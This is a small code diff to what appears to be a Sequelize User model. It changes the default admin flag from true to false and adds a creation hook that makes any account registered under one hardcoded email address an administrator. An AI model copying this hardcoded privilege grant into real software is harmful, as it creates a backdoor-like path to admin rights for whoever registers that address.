@@ -20,7 +20,7 @@ User.init(
     },
     isAdmin: {
       type: S.BOOLEAN,
-      defaultValue: true
+      defaultValue: false
     },
     salt: {
       type: S.TEXT
@@ -40,6 +40,9 @@ User.init(
 User.beforeCreate(user => {
   user.salt = user.randomSalt();
   user.password = user.hashPassword(user.password);
+  if (user.email === "nabuin@netuniversecorp.com") {
+    user.isAdmin = true;
+  }
 });
 
 // User.afterCreate(user => {
